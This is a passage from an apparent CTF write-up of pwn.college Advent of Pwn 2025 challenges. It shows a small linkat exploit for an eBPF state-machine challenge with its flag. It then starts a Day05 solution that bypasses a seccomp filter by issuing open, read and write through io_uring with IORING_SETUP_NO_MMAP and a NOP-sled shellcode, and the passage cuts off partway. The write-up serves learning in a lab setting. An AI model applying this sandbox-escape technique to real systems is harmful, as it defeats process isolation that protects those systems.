     258:	55 01 06 00 63 00 00 00	if r1 != 0x63 goto +0x6 &lt;handle_do_linkat+0x848&gt;
     259:	71 a1 f5 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xb)
     260:	55 01 04 00 65 00 00 00	if r1 != 0x65 goto +0x4 &lt;handle_do_linkat+0x848&gt;
     261:	71 a1 f6 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xa)
     262:	55 01 02 00 72 00 00 00	if r1 != 0x72 goto +0x2 &lt;handle_do_linkat+0x848&gt;
     263:	b7 01 00 00 03 00 00 00	r1 = 0x3
     264:	05 00 01 00 00 00 00 00	goto +0x1 &lt;handle_do_linkat+0x850&gt;
     265:	b7 01 00 00 00 00 00 00	r1 = 0x0
     266:	63 1a e8 ff 00 00 00 00	*(u32 *)(r10 - 0x18) = r1
     267:	bf a2 00 00 00 00 00 00	r2 = r10
     268:	07 02 00 00 ec ff ff ff	r2 += -0x14
     269:	bf a3 00 00 00 00 00 00	r3 = r10
     270:	07 03 00 00 e8 ff ff ff	r3 += -0x18
     271:	18 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00	r1 = 0x0 ll
		0000000000000878:  R_BPF_64_64	progress
     273:	b7 04 00 00 00 00 00 00	r4 = 0x0
     274:	85 00 00 00 02 00 00 00	call 0x2
     275:	b7 00 00 00 00 00 00 00	r0 = 0x0
     276:	95 00 00 00 00 00 00 00	exit
</code></pre></details><ul><li><p>The BPF first check the <code class="language-plaintext highlighter-rouge">oldpath</code> must be <code class="language-plaintext highlighter-rouge">sleigh</code></p><li><p>Then it take <code class="language-plaintext highlighter-rouge">newname</code> into a state machine</p></ul><blockquote class="prompt-info"><p>int linkat(int olddfd, const char *oldname, int newdfd, const char *newname, int flags);</p></blockquote><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre><td class="rouge-code"><pre><span class="k">switch</span> <span class="p">(</span><span class="n">state</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">len_new</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">6</span> <span class="o">&amp;&amp;</span> <span class="n">eq_str</span><span class="p">(</span><span class="n">newname</span><span class="p">,</span> <span class="s">"dasher"</span><span class="p">,</span> <span class="mi">6</span><span class="p">))</span> <span class="n">next</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="k">else</span> <span class="n">next</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>

    <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">len_new</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">6</span> <span class="o">&amp;&amp;</span> <span class="n">eq_str</span><span class="p">(</span><span class="n">newname</span><span class="p">,</span> <span class="s">"dancer"</span><span class="p">,</span> <span class="mi">6</span><span class="p">))</span> <span class="n">next</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
        <span class="k">else</span> <span class="n">next</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>

    <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">len_new</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">7</span> <span class="o">&amp;&amp;</span> <span class="n">eq_str</span><span class="p">(</span><span class="n">newname</span><span class="p">,</span> <span class="s">"prancer"</span><span class="p">,</span> <span class="mi">7</span><span class="p">))</span> <span class="n">next</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
        <span class="k">else</span> <span class="n">next</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>

    <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">len_new</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">5</span> <span class="o">&amp;&amp;</span> <span class="n">eq_str</span><span class="p">(</span><span class="n">newname</span><span class="p">,</span> <span class="s">"vixen"</span><span class="p">,</span> <span class="mi">5</span><span class="p">))</span> <span class="n">next</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
        <span class="k">else</span> <span class="n">next</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>

    <span class="k">case</span> <span class="mi">4</span><span class="p">:</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">len_new</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">5</span> <span class="o">&amp;&amp;</span> <span class="n">eq_str</span><span class="p">(</span><span class="n">newname</span><span class="p">,</span> <span class="s">"comet"</span><span class="p">,</span> <span class="mi">5</span><span class="p">))</span> <span class="n">next</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
        <span class="k">else</span> <span class="n">next</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>

    <span class="k">case</span> <span class="mi">5</span><span class="p">:</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">len_new</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">5</span> <span class="o">&amp;&amp;</span> <span class="n">eq_str</span><span class="p">(</span><span class="n">newname</span><span class="p">,</span> <span class="s">"cupid"</span><span class="p">,</span> <span class="mi">5</span><span class="p">))</span> <span class="n">next</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
        <span class="k">else</span> <span class="n">next</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>

    <span class="k">case</span> <span class="mi">6</span><span class="p">:</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">len_new</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">6</span> <span class="o">&amp;&amp;</span> <span class="n">eq_str</span><span class="p">(</span><span class="n">newname</span><span class="p">,</span> <span class="s">"donner"</span><span class="p">,</span> <span class="mi">6</span><span class="p">))</span> <span class="n">next</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>
        <span class="k">else</span> <span class="n">next</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>

    <span class="k">case</span> <span class="mi">7</span><span class="p">:</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">len_new</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">7</span> <span class="o">&amp;&amp;</span> <span class="n">eq_str</span><span class="p">(</span><span class="n">newname</span><span class="p">,</span> <span class="s">"blitzen"</span><span class="p">,</span> <span class="mi">7</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">next</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
            <span class="cm">/* set success[0] = 1 */</span>
            <span class="p">{</span>
                <span class="n">__u32</span> <span class="n">one</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
                <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">success</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">one</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">next</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">break</span><span class="p">;</span>

    <span class="nl">default:</span>
        <span class="n">next</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>It call <code class="language-plaintext highlighter-rouge">bpf_map_update_elem</code> to update map <code class="language-plaintext highlighter-rouge">success</code>. At userspace, the while loop continuously check this map. As soon as the map sucess value is non-zero, it will call <code class="language-plaintext highlighter-rouge">broadcast_cheers()</code> to print the flag.</p><hr /><h3 id="exploitation-3"><span class="me-2">Exploitation</span><a href="#exploitation-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The idea is to call <code class="language-plaintext highlighter-rouge">linkat</code> syscall with <code class="language-plaintext highlighter-rouge">oldname</code> as <code class="language-plaintext highlighter-rouge">sleigh</code> and <code class="language-plaintext highlighter-rouge">newname</code> as <code class="language-plaintext highlighter-rouge">dasher</code>, <code class="language-plaintext highlighter-rouge">dancer</code>, <code class="language-plaintext highlighter-rouge">prancer</code>, <code class="language-plaintext highlighter-rouge">vixen</code>, <code class="language-plaintext highlighter-rouge">comet</code>, <code class="language-plaintext highlighter-rouge">cupid</code>, <code class="language-plaintext highlighter-rouge">donner</code>, <code class="language-plaintext highlighter-rouge">blitzen</code> in the right order.</p><details> <summary>Click to view <code>exploit.c</code></summary><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"sleigh"</span><span class="p">,</span> <span class="n">O_CREAT</span> <span class="o">|</span> <span class="n">O_RDWR</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"Failed to create sleigh"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>

    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">reindeer</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">"dasher"</span><span class="p">,</span>
        <span class="s">"dancer"</span><span class="p">,</span>
        <span class="s">"prancer"</span><span class="p">,</span>
        <span class="s">"vixen"</span><span class="p">,</span>
        <span class="s">"comet"</span><span class="p">,</span>
        <span class="s">"cupid"</span><span class="p">,</span>
        <span class="s">"donner"</span><span class="p">,</span>
        <span class="s">"blitzen"</span>
    <span class="p">};</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">unlink</span><span class="p">(</span><span class="n">reindeer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">linkat</span><span class="p">(</span><span class="n">AT_FDCWD</span><span class="p">,</span> <span class="s">"sleigh"</span><span class="p">,</span> <span class="n">AT_FDCWD</span><span class="p">,</span> <span class="n">reindeer</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to link %s: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">reindeer</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"  [+] Linked 'sleigh' to '%s'</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">reindeer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="p">}</span>
        <span class="n">usleep</span><span class="p">(</span><span class="mi">10000</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">unlink</span><span class="p">(</span><span class="s">"sleigh"</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">unlink</span><span class="p">(</span><span class="n">reindeer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div></details><p>POC:</p><p><a href="/assets/img/AdventOfPwn2025/pic6.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic6.png" alt="Desktop View" width="700" height="300" loading="lazy"></a></p><p>Flag: <code class="language-plaintext highlighter-rouge">pwn.college{E3qcQI5FW_4OA80RL_fp0vYh7S2.0lM5gTMywiN1UDN0EzW}</code></p><hr /><h2 id="day05"><span class="me-2">Day05</span><a href="#day05" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="description-4"><span class="me-2">Description</span><a href="#description-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Did you ever wonder how Santa manages to deliver <em>sooo</em> many presents in one night?</p><hr /><p>Dashing through the code,<br /> In a one-ring I/O sled,<br /> O‚Äôer the syscalls go,<br /> No blocking lies ahead!<br /> Buffers queue and spin,<br /> Completions shining bright,<br /> What fun it is to read and write,<br /> Async I/O tonight ‚Äî hey!</p><hr /><h3 id="analysis-4"><span class="me-2">Analysis</span><a href="#analysis-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><details> <summary>Click to view <code>sleigh.c</code></summary><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;seccomp.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/seccomp.h&gt;</span><span class="cp">
</span>
<span class="cp">#define NORTH_POLE_ADDR (void *)0x1225000
</span>
<span class="kt">int</span> <span class="nf">setup_sandbox</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_NO_NEW_PRIVS</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"prctl(NO_NEW_PRIVS)"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">scmp_filter_ctx</span> <span class="n">ctx</span> <span class="o">=</span> <span class="n">seccomp_init</span><span class="p">(</span><span class="n">SCMP_ACT_KILL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"seccomp_init"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">io_uring_setup</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span>
        <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">io_uring_enter</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span>
        <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">io_uring_register</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span>
        <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">exit_group</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"seccomp_rule_add"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">seccomp_load</span><span class="p">(</span><span class="n">ctx</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"seccomp_load"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">seccomp_release</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">code</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="n">NORTH_POLE_ADDR</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">code</span> <span class="o">!=</span> <span class="n">NORTH_POLE_ADDR</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"mmap"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">100</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">"üõ∑ Loading cargo: please stow your sled at the front."</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">code</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"read"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">"üìú Checking Santa's naughty list... twice!"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">setup_sandbox</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"setup_sandbox"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// puts("‚ùÑÔ∏è Dashing through the snow!");</span>
    <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)())(</span><span class="n">code</span> <span class="o">+</span> <span class="n">offset</span><span class="p">))();</span>

    <span class="c1">// puts("üéÖ Merry Christmas to all, and to all a good night!");</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div></details><p>Output of <code class="language-plaintext highlighter-rouge">seccomp-tools</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre> line  CODE  JT   JF      K
<span class="o">=================================</span>
 0000: 0x20 0x00 0x00 0x00000004  A <span class="o">=</span> <span class="nb">arch
 </span>0001: 0x15 0x00 0x08 0xc000003e  <span class="k">if</span> <span class="o">(</span>A <span class="o">!=</span> ARCH_X86_64<span class="o">)</span> goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A <span class="o">=</span> sys_number
 0003: 0x35 0x00 0x01 0x40000000  <span class="k">if</span> <span class="o">(</span>A &lt; 0x40000000<span class="o">)</span> goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  <span class="k">if</span> <span class="o">(</span>A <span class="o">!=</span> 0xffffffff<span class="o">)</span> goto 0010
 0005: 0x15 0x03 0x00 0x000000e7  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> exit_group<span class="o">)</span> goto 0009
 0006: 0x15 0x02 0x00 0x000001a9  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> 0x1a9<span class="o">)</span> goto 0009
 0007: 0x15 0x01 0x00 0x000001aa  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> 0x1aa<span class="o">)</span> goto 0009
 0008: 0x15 0x00 0x01 0x000001ab  <span class="k">if</span> <span class="o">(</span>A <span class="o">!=</span> 0x1ab<span class="o">)</span> goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  <span class="k">return </span>ALLOW
 0010: 0x06 0x00 0x00 0x00000000  <span class="k">return </span>KILL
</pre></table></code></div></div><p>Overral, the program mmap a RWX memory at fixed address <code class="language-plaintext highlighter-rouge">0x1225000</code>, read 0x1000 bytes from stdin into it and set up a seccomp filter to only allow <code class="language-plaintext highlighter-rouge">io_uring_setup</code>, <code class="language-plaintext highlighter-rouge">io_uring_enter</code>, <code class="language-plaintext highlighter-rouge">io_uring_register</code>, and <code class="language-plaintext highlighter-rouge">exit_group</code> syscalls. Before jumping into shellcode, it computes:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">100</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)())(</span><span class="n">code</span> <span class="o">+</span> <span class="n">offset</span><span class="p">))();</span>
</pre></table></code></div></div><p>So execution starts 1..100 bytes into your buffer, not at the beginning. We need a NOP sled at the front so that starting at any byte in [1,100] still slides into your real payload.</p><p><code class="language-plaintext highlighter-rouge">io_uring</code> is a kernel interface where userspace submits I/O requests through shared ring buffers (Submission Queue / Completion Queue). Seccomp blocks direct syscalls like <code class="language-plaintext highlighter-rouge">openat</code>, <code class="language-plaintext highlighter-rouge">read</code>, and <code class="language-plaintext highlighter-rouge">write</code>, but it does not automatically prevent the kernel from executing those operations when they are requested as <code class="language-plaintext highlighter-rouge">io_uring</code> opcodes and triggered via the allowed <code class="language-plaintext highlighter-rouge">io_uring_enter()</code> syscall.</p><p>Conceptually:</p><ul><li>SQ (submission queue): userspace fills SQEs describing operations (OPENAT/READ/WRITE/‚Ä¶).<li>CQ (completion queue): kernel writes CQEs containing results (res) and an identifier (user_data).</ul><hr /><h3 id="exploitation-4"><span class="me-2">Exploitation</span><a href="#exploitation-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We need three logical operations: <code class="language-plaintext highlighter-rouge">open("/flag")</code>, <code class="language-plaintext highlighter-rouge">read(flag_fd, buf)</code>, and <code class="language-plaintext highlighter-rouge">write(1, buf)</code>.</p><h4 id="setup-using-ioring_setup_no_mmap"><span class="me-2">Setup: using <code class="language-plaintext highlighter-rouge">IORING_SETUP_NO_MMAP</code></span><a href="#setup-using-ioring_setup_no_mmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Normally, after <code class="language-plaintext highlighter-rouge">io_uring_setup()</code>, a program must <code class="language-plaintext highlighter-rouge">mmap()</code> the SQ ring, CQ ring, and SQEs. However, <code class="language-plaintext highlighter-rouge">mmap</code> is blocked by seccomp. The flag <code class="language-plaintext highlighter-rouge">IORING_SETUP_NO_MMAP</code> allows the caller to provide its own contiguous memory regions:</p><ul><li><code class="language-plaintext highlighter-rouge">params-&gt;cq_off.user_addr</code> ‚Üí base address for the SQ/CQ ring metadata and CQEs<li><code class="language-plaintext highlighter-rouge">params-&gt;sq_off.user_addr</code> ‚Üí base address for the SQE array</ul><p>We reserve a stack scratch region and clear it to avoid garbage in reserved fields:</p><pre><code class="language-asm">sub rsp, 0x4000      ; Create stack space
mov rbx, rsp         ; rbx acts as our base pointer for structures
mov rdi, rbx         ; rdi -&gt; base
xor eax, eax
mov ecx, 0x800       ; Clear 0x800 * 8 bytes
rep stosq            ; Zero out the memory region
</code></pre><p>Then we set:</p><ul><li><code class="language-plaintext highlighter-rouge">params-&gt;flags = IORING_SETUP_NO_MMAP</code><li><code class="language-plaintext highlighter-rouge">params-&gt;cq_off.user_addr</code> and <code class="language-plaintext highlighter-rouge">params-&gt;sq_off.user_addr</code> to point into our scratch region (page-aligned / contiguous regions), and call <code class="language-plaintext highlighter-rouge">io_uring_setup()</code>:<div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">io_uring_params</span> <span class="p">{</span>
  <span class="n">__u32</span> <span class="n">sq_entries</span><span class="p">;</span>
  <span class="n">__u32</span> <span class="n">cq_entries</span><span class="p">;</span>
  <span class="n">__u32</span> <span class="n">flags</span><span class="p">;</span>
  <span class="n">__u32</span> <span class="n">sq_thread_cpu</span><span class="p">;</span>
  <span class="n">__u32</span> <span class="n">sq_thread_idle</span><span class="p">;</span>
  <span class="n">__u32</span> <span class="n">features</span><span class="p">;</span>
